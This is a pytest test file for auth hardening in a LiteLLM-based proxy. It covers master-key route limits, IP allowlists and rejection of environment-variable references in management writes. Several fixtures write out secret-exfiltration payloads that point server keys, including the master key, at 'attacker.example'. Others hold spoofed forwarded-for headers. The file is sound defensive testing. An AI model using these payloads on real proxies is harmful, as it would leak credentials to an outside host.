"""TokenWeave auth hardening for the proxy master key and management writes."""

from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException, Request

from litellm.constants import LITELLM_PROXY_MASTER_KEY_ALIAS
from litellm.proxy import proxy_server
from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
from litellm.proxy.auth.route_checks import RouteChecks
from litellm.proxy.auth.user_api_key_auth import user_api_key_auth

_MASTER_KEY = "sk-master-key"


def _patch_proxy_server(monkeypatch, *, cached_master_key: bool = False) -> None:
    cache = AsyncMock()
    cache.async_get_cache = AsyncMock(
        return_value=(
            UserAPIKeyAuth(
                api_key=LITELLM_PROXY_MASTER_KEY_ALIAS,
                user_role=LitellmUserRoles.PROXY_ADMIN,
                user_id="admin",
            )
            if cached_master_key
            else None
        )
    )
    cache.delete_cache = MagicMock()
    logging_obj = MagicMock()
    logging_obj.internal_usage_cache.dual_cache.async_delete_cache = AsyncMock()
    logging_obj.post_call_failure_hook = AsyncMock(return_value=None)
    attrs = {
        "prisma_client": MagicMock(),
        "user_api_key_cache": cache,
        "proxy_logging_obj": logging_obj,
        "master_key": _MASTER_KEY,
        "general_settings": {},
        "llm_model_list": [],
        "llm_router": None,
        "open_telemetry_logger": None,
        "model_max_budget_limiter": MagicMock(),
        "user_custom_auth": None,
        "jwt_handler": None,
        "litellm_proxy_admin_name": "admin",
    }
    for name, value in attrs.items():
        monkeypatch.setattr(proxy_server, name, value, raising=False)


def _request(method, path, template, *, headers=(), client=None, body=b"") -> Request:
    scope = {"type": "http", "path": path, "headers": list(headers)}
    if method is not None:
        scope["method"] = method
    if template is not None:
        scope["route"] = SimpleNamespace(path=template)
    if client is not None:
        scope["client"] = client
    request = Request(scope)
    request._body = body
    return request


async def _authenticate(request: Request):
    return await user_api_key_auth(
        request=request,
        api_key=f"Bearer {_MASTER_KEY}",
        azure_api_key_header="",
        anthropic_api_key_header=None,
        google_ai_studio_api_key_header=None,
        azure_apim_header=None,
        custom_litellm_key_header=None,
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("cached", [False, True])
@pytest.mark.parametrize(
    ("method", "path", "template", "allowed"),
    [
        ("POST", "/user/new", "/user/new", True),
        ("POST", "/key/generate", "/key/generate", True),
        ("POST", "/invitation/new", "/invitation/new", True),
        ("POST", "/invitation/delete", "/invitation/delete", True),
        ("GET", "/v1/models", "/v1/models", True),
        ("GET", "/spend/logs/ui/req-1", "/spend/logs/ui/{request_id}", True),
        ("POST", "/v1/chat/completions", "/v1/chat/completions", False),
        ("POST", "/v1/responses", "/v1/responses", False),
        ("POST", "/v1/messages", "/v1/messages", False),
        ("POST", "/openai/chat/completions", "/{provider}/{endpoint:path}", False),
        ("GET", "/health", "/health", False),
        ("POST", "/key/health", "/key/health", False),
        ("GET", "/user/new", "/user/new", False),
        (None, "/v1/realtime", None, False),
    ],
)
async def test_master_key_management_only_applies_to_all_auth_paths(
    monkeypatch, cached, method, path, template, allowed
):
    _patch_proxy_server(monkeypatch, cached_master_key=cached)
    monkeypatch.setenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", "true")
    request = _request(method, path, template)

    with patch(
        "litellm.proxy.auth.user_api_key_auth.run_centralized_common_checks",
        new_callable=AsyncMock,
    ) as common_checks:
        if allowed:
            assert (await _authenticate(request)).api_key == LITELLM_PROXY_MASTER_KEY_ALIAS
            common_checks.assert_awaited_once()
        else:
            with pytest.raises(HTTPException) as denied:
                await _authenticate(request)
            assert denied.value.status_code == 403
            assert denied.value.detail == "The proxy master key is restricted to management routes."
            common_checks.assert_not_awaited()


def test_management_only_does_not_restrict_virtual_keys(monkeypatch):
    monkeypatch.setenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", "true")
    assert RouteChecks.should_call_route(
        route="/v1/responses",
        valid_token=UserAPIKeyAuth(
            api_key="virtual-key-hash",
            allowed_routes=["llm_api_routes"],
            user_role=LitellmUserRoles.INTERNAL_USER,
        ),
        request=_request("POST", "/v1/responses", "/v1/responses"),
    )


def test_management_only_is_off_unless_enabled(monkeypatch):
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    assert RouteChecks.should_call_route(
        route="/v1/chat/completions",
        valid_token=UserAPIKeyAuth(api_key=LITELLM_PROXY_MASTER_KEY_ALIAS, user_role=LitellmUserRoles.PROXY_ADMIN),
        request=_request("POST", "/v1/chat/completions", "/v1/chat/completions"),
    )


def _master_key_request(headers=None, client=("10.0.0.5", 1234), method="GET", path="/key/list") -> Request:
    return _request(
        method,
        path,
        path,
        headers=[(k.lower().encode(), v.encode()) for k, v in (headers or {}).items()],
        client=client,
    )


def _master_key_token() -> UserAPIKeyAuth:
    return UserAPIKeyAuth(api_key=LITELLM_PROXY_MASTER_KEY_ALIAS, user_role=LitellmUserRoles.PROXY_ADMIN)


@pytest.mark.parametrize(
    "headers, client, allowed",
    [
        # The hop appended by the load balancer decides.
        ({"x-forwarded-for": "203.0.113.7"}, ("10.0.0.5", 1), True),
        ({"x-forwarded-for": "198.51.100.9"}, ("10.0.0.5", 1), False),
        # A client-supplied earlier hop naming an allowed address must not help.
        ({"x-forwarded-for": "203.0.113.7, 198.51.100.9"}, ("10.0.0.5", 1), False),
        # ...and a spoofed disallowed earlier hop must not hurt an allowed caller.
        ({"x-forwarded-for": "198.51.100.9, 203.0.113.7"}, ("10.0.0.5", 1), True),
        # CIDR entries match.
        ({"x-forwarded-for": "192.0.2.77"}, ("10.0.0.5", 1), True),
        # No header: the socket peer is used.
        ({}, ("203.0.113.7", 1), True),
        ({}, ("10.0.0.5", 1), False),
        # Nothing usable identifies the source.
        ({}, None, False),
        ({"x-forwarded-for": "not-an-ip"}, ("203.0.113.7", 1), False),
    ],
)
def test_master_key_allowed_ips(monkeypatch, headers, client, allowed):
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    monkeypatch.setenv("LITELLM_MASTER_KEY_ALLOWED_IPS", "203.0.113.7, 192.0.2.0/24")
    request = _master_key_request(headers=headers, client=client)
    if allowed:
        assert RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=request)
    else:
        with pytest.raises(HTTPException) as denied:
            RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=request)
        assert denied.value.status_code == 403
        assert "source address" in denied.value.detail


@pytest.mark.parametrize("value", [None, "", "   "])
def test_master_key_allowed_ips_unset_means_no_restriction(monkeypatch, value):
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    if value is None:
        monkeypatch.delenv("LITELLM_MASTER_KEY_ALLOWED_IPS", raising=False)
    else:
        monkeypatch.setenv("LITELLM_MASTER_KEY_ALLOWED_IPS", value)
    request = _master_key_request(headers={"x-forwarded-for": "198.51.100.9"})
    assert RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=request)


def test_master_key_allowed_ips_all_invalid_entries_deny(monkeypatch):
    """A set but unusable value must fail closed, not lift the restriction."""
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    monkeypatch.setenv("LITELLM_MASTER_KEY_ALLOWED_IPS", "office, nonsense/99")
    request = _master_key_request(headers={"x-forwarded-for": "203.0.113.7"})
    with pytest.raises(HTTPException) as denied:
        RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=request)
    assert denied.value.status_code == 403


def test_master_key_allowed_ips_does_not_restrict_virtual_keys(monkeypatch):
    monkeypatch.setenv("LITELLM_MASTER_KEY_ALLOWED_IPS", "203.0.113.7")
    request = _master_key_request(headers={"x-forwarded-for": "198.51.100.9"}, method="POST", path="/v1/responses")
    assert RouteChecks.should_call_route(
        route="/v1/responses",
        valid_token=UserAPIKeyAuth(
            api_key="virtual-key-hash",
            allowed_routes=["llm_api_routes"],
            user_role=LitellmUserRoles.INTERNAL_USER,
        ),
        request=request,
    )


def test_master_key_allowed_ips_applies_before_management_only(monkeypatch):
    """Both restrictions hold together: an allowed source is still limited to
    management routes, and a disallowed source is refused on a management route."""
    monkeypatch.setenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", "true")
    monkeypatch.setenv("LITELLM_MASTER_KEY_ALLOWED_IPS", "203.0.113.7")
    ok = _master_key_request(headers={"x-forwarded-for": "203.0.113.7"})
    assert RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=ok)
    llm = _master_key_request(headers={"x-forwarded-for": "203.0.113.7"}, method="POST", path="/v1/responses")
    with pytest.raises(HTTPException) as denied:
        RouteChecks.should_call_route(route="/v1/responses", valid_token=_master_key_token(), request=llm)
    assert "management routes" in denied.value.detail
    bad = _master_key_request(headers={"x-forwarded-for": "198.51.100.9"})
    with pytest.raises(HTTPException) as denied:
        RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=bad)
    assert "source address" in denied.value.detail


@pytest.mark.parametrize(
    "method, route, body",
    [
        # The reported exfiltration shape: a model whose key is a server env var.
        (
            "POST",
            "/model/new",
            {
                "model_name": "m",
                "litellm_params": {
                    "model": "openai/x",
                    "api_key": "os.environ/OPENAI_API_KEY",
                    "api_base": "https://attacker.example",
                },
            },
        ),
        ("POST", "/model/update", {"litellm_params": {"api_key": "os.environ/ANTHROPIC_API_KEY"}}),
        ("PATCH", "/model/abc/update", {"litellm_params": {"aws_secret_access_key": "os.environ/AWS_SECRET_ACCESS_KEY"}}),
        ("POST", "/credentials", {"credential_name": "c", "credential_values": {"api_key": "os.environ/DB_PASSWORD"}}),
        (
            "POST",
            "/config/pass_through_endpoint",
            {"path": "/x", "target": "https://attacker.example", "headers": {"Authorization": "os.environ/LITELLM_MASTER_KEY"}},
        ),
        ("POST", "/config/update", {"environment_variables": {"X": "os.environ/LITELLM_MASTER_KEY"}}),
        # Nested inside lists, and used as a key.
        ("POST", "/guardrails", {"guardrail": {"litellm_params": {"headers": [{"k": "os.environ/GEMINI_API_KEY"}]}}}),
        ("PUT", "/search_tools/abc", {"litellm_params": {"os.environ/QWEN_API_KEY": "x"}}),
    ],
)
def test_management_write_with_env_reference_is_rejected(method, route, body):
    with pytest.raises(HTTPException) as denied:
        RouteChecks.reject_env_references_in_management_writes(
            route=route, request=_request(method, route, None), request_data=body
        )
    assert denied.value.status_code == 400
    assert "Environment variable references" in denied.value.detail


@pytest.mark.parametrize(
    "method, route, body",
    [
        # Ordinary management writes pass.
        (
            "POST",
            "/model/new",
            {"model_name": "m", "litellm_params": {"model": "openai/x", "api_key": "sk-literal", "api_base": "https://api.example"}},
        ),
        ("POST", "/key/generate", {"key_alias": "000001", "metadata": {"note": "mentions os.environ/ in the middle"}}),
        # Reads are not inspected.
        ("GET", "/model/info", {"x": "os.environ/OPENAI_API_KEY"}),
        # Model calls are not inspected: prompt text is user content.
        ("POST", "/v1/chat/completions", {"model": "m", "messages": [{"role": "user", "content": "os.environ/HOME"}]}),
        ("POST", "/v1/messages", {"model": "m", "messages": [{"role": "user", "content": "os.environ/HOME"}]}),
        ("POST", "/v1/responses", {"model": "m", "input": "os.environ/HOME"}),
        # Nothing to inspect.
        ("POST", "/model/new", {}),
        ("POST", "/model/new", None),
    ],
)
def test_management_write_env_check_allows(method, route, body):
    RouteChecks.reject_env_references_in_management_writes(
        route=route, request=_request(method, route, None), request_data=body
    )


@pytest.mark.asyncio
async def test_user_api_key_auth_rejects_env_reference_on_model_new(monkeypatch):
    """End to end through user_api_key_auth: even the master key cannot store an
    env reference."""
    _patch_proxy_server(monkeypatch)
    monkeypatch.delenv("LITELLM_MASTER_KEY_ALLOWED_IPS", raising=False)
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    request = _request(
        "POST",
        "/model/new",
        "/model/new",
        headers=[(b"content-type", b"application/json")],
        body=(
            b'{"model_name":"m","litellm_params":{"model":"openai/x",'
            b'"api_key":"os.environ/OPENAI_API_KEY","api_base":"https://attacker.example"}}'
        ),
    )
    with patch(
        "litellm.proxy.auth.user_api_key_auth.run_centralized_common_checks",
        new_callable=AsyncMock,
    ) as common_checks:
        with pytest.raises(HTTPException) as denied:
            await _authenticate(request)
        common_checks.assert_not_awaited()
    assert denied.value.status_code == 400
    assert "Environment variable references" in str(denied.value.detail)


@pytest.mark.parametrize(
    "method, route",
    [
        ("POST", "/config/update"),
        ("POST", "/config/field/update"),
        ("POST", "/config/callback/delete"),
        ("POST", "/config/pass_through_endpoint"),
        ("DELETE", "/config/pass_through_endpoint"),
        ("POST", "/update/sso_settings"),
        ("PATCH", "/update/ui_settings"),
        ("POST", "/cache/settings"),
        ("POST", "/cache/settings/test"),
        ("POST", "/config_overrides/hashicorp_vault"),
        ("POST", "/credentials"),
        ("PATCH", "/credentials/some-name"),
    ],
)
def test_config_file_only_mode_rejects_runtime_config_writes(monkeypatch, method, route):
    monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", "true")
    with pytest.raises(HTTPException) as denied:
        RouteChecks.reject_config_writes_in_file_only_mode(route=route, request=_request(method, route, None))
    assert denied.value.status_code == 403


@pytest.mark.parametrize(
    "method, route",
    [
        ("GET", "/config/list"),
        ("GET", "/get/config/callbacks"),
        ("GET", "/credentials"),
        ("POST", "/key/generate"),
        ("POST", "/user/update"),
        ("POST", "/v1/chat/completions"),
        ("POST", "/configuration-lookalike"),
    ],
)
def test_config_file_only_mode_allows_reads_and_other_writes(monkeypatch, method, route):
    monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", "true")
    RouteChecks.reject_config_writes_in_file_only_mode(route=route, request=_request(method, route, None))


@pytest.mark.parametrize("value", [None, "false", ""])
def test_config_file_only_mode_off_allows_config_writes(monkeypatch, value):
    if value is None:
        monkeypatch.delenv("LITELLM_CONFIG_FILE_ONLY", raising=False)
    else:
        monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", value)
    RouteChecks.reject_config_writes_in_file_only_mode(
        route="/config/update", request=_request("POST", "/config/update", None)
    )


@pytest.mark.asyncio
async def test_user_api_key_auth_applies_config_file_only_mode(monkeypatch):
    _patch_proxy_server(monkeypatch)
    monkeypatch.delenv("LITELLM_MASTER_KEY_ALLOWED_IPS", raising=False)
    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
    monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", "true")
    request = _request("POST", "/config/update", "/config/update", body=b"{}")
    with patch(
        "litellm.proxy.auth.user_api_key_auth.run_centralized_common_checks",
        new_callable=AsyncMock,
    ):
        with pytest.raises(HTTPException) as denied:
            await _authenticate(request)
    assert denied.value.status_code == 403
    assert "Runtime configuration changes are disabled" in str(denied.value.detail)


def test_config_file_environment_variables_cannot_enable_executable_credentials(monkeypatch):
    import os

    for name in ("GOOGLE_EXTERNAL_ACCOUNT_ALLOW_EXECUTABLES", "GOOGLE_APPLICATION_CREDENTIALS"):
        monkeypatch.delenv(name, raising=False)
    proxy_server.ProxyConfig()._load_environment_variables(
        config={
            "environment_variables": {
                "GOOGLE_EXTERNAL_ACCOUNT_ALLOW_EXECUTABLES": "1",
                "GOOGLE_APPLICATION_CREDENTIALS": "/tmp/x.json",
            }
        }
    )
    assert os.environ.get("GOOGLE_EXTERNAL_ACCOUNT_ALLOW_EXECUTABLES") is None
    assert os.environ.get("GOOGLE_APPLICATION_CREDENTIALS") is None


@pytest.mark.parametrize(
    "method, route",
    [
        ("POST", "/v1/mcp/server"),
        ("PUT", "/v1/mcp/server"),
        ("DELETE", "/v1/mcp/server/abc"),
        ("POST", "/v1/mcp/server/register"),
        ("POST", "/v1/mcp/toolset"),
        ("POST", "/mcp-rest/test/connection"),
        ("POST", "/mcp-rest/test/tools/list"),
        ("POST", "/guardrails"),
        ("PUT", "/guardrails/abc"),
        ("PATCH", "/guardrails/abc"),
        ("DELETE", "/guardrails/abc"),
        ("POST", "/guardrails/register"),
        ("POST", "/guardrails/test_custom_code"),
    ],
)
def test_config_file_only_mode_rejects_mcp_and_guardrail_writes(monkeypatch, method, route):
    monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", "true")
    with pytest.raises(HTTPException) as denied:
        RouteChecks.reject_config_writes_in_file_only_mode(route=route, request=_request(method, route, route))
    assert denied.value.status_code == 403


@pytest.mark.parametrize(
    "method, route",
    [
        ("GET", "/v1/mcp/server"),
        ("GET", "/guardrails/list"),
        ("POST", "/guardrails/apply_guardrail"),
        ("POST", "/mcp-rest/tools/call"),
        ("POST", "/guardrails-lookalike"),
    ],
)
def test_config_file_only_mode_keeps_mcp_and_guardrail_reads_and_inference(monkeypatch, method, route):
    monkeypatch.setenv("LITELLM_CONFIG_FILE_ONLY", "true")
    RouteChecks.reject_config_writes_in_file_only_mode(route=route, request=_request(method, route, route))


_TRUSTED = {"x-forwarded-for": "203.0.113.7"}
_UNTRUSTED = {"x-forwarded-for": "198.51.100.9"}


def _admin_token(role=LitellmUserRoles.PROXY_ADMIN, team_id="team-1"):
    return UserAPIKeyAuth(api_key="virtual-key-hash", user_id="admin-user", team_id=team_id, user_role=role)


def _admin_env(monkeypatch, session_only=True, admin_ips=None, master_ips="203.0.113.7"):
    for name, value in (
        ("LITELLM_ADMIN_SESSION_ONLY", "true" if session_only else None),
        ("LITELLM_ADMIN_ALLOWED_IPS", admin_ips),
        ("LITELLM_MASTER_KEY_ALLOWED_IPS", master_ips),
    ):
        if value is None:
            monkeypatch.delenv(name, raising=False)
        else:
            monkeypatch.setenv(name, value)


@pytest.mark.parametrize("role", [LitellmUserRoles.PROXY_ADMIN, LitellmUserRoles.PROXY_ADMIN_VIEW_ONLY, "proxy_admin"])
@pytest.mark.parametrize(
    "method, path",
    [
        ("GET", "/key/list"),
        ("GET", "/user/list"),
        ("GET", "/spend/logs/v2"),
        ("POST", "/key/generate"),
        ("POST", "/user/update"),
        ("POST", "/key/info"),
    ],
)
def test_admin_api_key_cannot_reach_management_routes(monkeypatch, role, method, path):
    """An administrator's everyday API key carries no administrative power, even
    from a trusted source."""
    _admin_env(monkeypatch)
    token = _admin_token()
    token.user_role = role
    request = _master_key_request(headers=_TRUSTED, method=method, path=path)
    with pytest.raises(HTTPException) as denied:
        RouteChecks.should_call_route(route=path, valid_token=token, request=request)
    assert denied.value.status_code == 403
    assert "Administrator API keys" in denied.value.detail


@pytest.mark.parametrize(
    "headers, method, path",
    [
        (_UNTRUSTED, "POST", "/v1/chat/completions"),
        (_UNTRUSTED, "POST", "/v1/responses"),
        (_UNTRUSTED, "POST", "/v1/messages"),
        (_UNTRUSTED, "GET", "/v1/models"),
        # Services that validate a caller's key read its own info, from any address.
        (_UNTRUSTED, "GET", "/key/info"),
        ({}, "GET", "/key/info"),
    ],
)
def test_admin_api_key_keeps_model_routes_and_own_key_info(monkeypatch, headers, method, path):
    _admin_env(monkeypatch)
    request = _master_key_request(headers=headers, client=("127.0.0.1", 1), method=method, path=path)
    assert RouteChecks.should_call_route(route=path, valid_token=_admin_token(), request=request)


@pytest.mark.parametrize("role", [LitellmUserRoles.PROXY_ADMIN, LitellmUserRoles.PROXY_ADMIN_VIEW_ONLY])
@pytest.mark.parametrize(
    "method, path", [("GET", "/key/list"), ("POST", "/user/update"), ("POST", "/v1/chat/completions")]
)
def test_admin_ui_session_requires_allowed_source(monkeypatch, role, method, path):
    from litellm.constants import UI_SESSION_TOKEN_TEAM_ID

    _admin_env(monkeypatch)
    token = _admin_token(role=role, team_id=UI_SESSION_TOKEN_TEAM_ID)
    ok = _master_key_request(headers=_TRUSTED, method=method, path=path)
    assert RouteChecks.should_call_route(route=path, valid_token=token, request=ok)
    for headers in (_UNTRUSTED, {"x-forwarded-for": "203.0.113.7, 198.51.100.9"}):
        bad = _master_key_request(headers=headers, method=method, path=path)
        with pytest.raises(HTTPException) as denied:
            RouteChecks.should_call_route(route=path, valid_token=token, request=bad)
        assert denied.value.status_code == 403
        assert "source address" in denied.value.detail


def test_admin_allowed_ips_override_master_key_list(monkeypatch):
    from litellm.constants import UI_SESSION_TOKEN_TEAM_ID

    _admin_env(monkeypatch, admin_ips="192.0.2.0/24")
    token = _admin_token(team_id=UI_SESSION_TOKEN_TEAM_ID)
    ok = _master_key_request(headers={"x-forwarded-for": "192.0.2.9"})
    assert RouteChecks.should_call_route(route="/key/list", valid_token=token, request=ok)
    with pytest.raises(HTTPException):
        RouteChecks.should_call_route(
            route="/key/list", valid_token=token, request=_master_key_request(headers=_TRUSTED)
        )
    # The master key keeps its own list.
    assert RouteChecks.should_call_route(
        route="/key/list", valid_token=_master_key_token(), request=_master_key_request(headers=_TRUSTED)
    )


def test_admin_allowed_ips_all_invalid_entries_deny(monkeypatch):
    from litellm.constants import UI_SESSION_TOKEN_TEAM_ID

    _admin_env(monkeypatch, admin_ips="office")
    token = _admin_token(team_id=UI_SESSION_TOKEN_TEAM_ID)
    with pytest.raises(HTTPException):
        RouteChecks.should_call_route(
            route="/key/list", valid_token=token, request=_master_key_request(headers=_TRUSTED)
        )


def test_admin_api_key_without_session_only_needs_allowed_source(monkeypatch):
    """With the session-only flag off an admin API key still manages, but only
    from an allowed source; model calls stay open."""
    _admin_env(monkeypatch, session_only=False)
    token = _admin_token()
    assert RouteChecks.should_call_route(
        route="/key/list", valid_token=token, request=_master_key_request(headers=_TRUSTED)
    )
    with pytest.raises(HTTPException) as denied:
        RouteChecks.should_call_route(
            route="/key/list", valid_token=token, request=_master_key_request(headers=_UNTRUSTED)
        )
    assert "source address" in denied.value.detail
    llm = _master_key_request(headers=_UNTRUSTED, method="POST", path="/v1/responses")
    assert RouteChecks.should_call_route(route="/v1/responses", valid_token=token, request=llm)


def test_admin_restrictions_unset_change_nothing(monkeypatch):
    _admin_env(monkeypatch, session_only=False, master_ips=None)
    request = _master_key_request(headers=_UNTRUSTED, method="POST", path="/key/generate")
    assert RouteChecks.should_call_route(route="/key/generate", valid_token=_admin_token(), request=request)


@pytest.mark.parametrize("method, path", [("GET", "/key/info"), ("GET", "/user/info"), ("POST", "/key/generate")])
def test_admin_restrictions_do_not_touch_internal_users(monkeypatch, method, path):
    _admin_env(monkeypatch)
    token = _admin_token(role=LitellmUserRoles.INTERNAL_USER)
    request = _master_key_request(headers=_UNTRUSTED, method=method, path=path)
    assert RouteChecks.should_call_route(route=path, valid_token=token, request=request)
